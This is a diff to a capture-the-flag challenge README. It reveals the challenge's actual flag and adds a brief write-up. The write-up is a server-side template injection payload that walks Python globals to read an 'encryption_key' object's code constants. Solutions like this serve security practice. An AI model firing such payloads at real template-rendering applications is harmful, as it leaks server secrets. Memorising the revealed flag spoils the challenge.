@@ -20,10 +20,16 @@ Author: `exploitio`
 12555
 
 ## Flag
-EXPLOITIO{_________________FLAG_________________}
+EXPLOITIO{I_4M_Th3_M4ST3R_0F_SSTI}
 
 ## Hint
 1. Please Don't Brute Force the Website, The FW may Block You!
 2. It is NOT XSS!
 
 ## Write-UPs
+
+in the html code text box enter following text
+
+```py
+{self.__init__.__globals__[encryption_key].__code__.co_consts}
+```
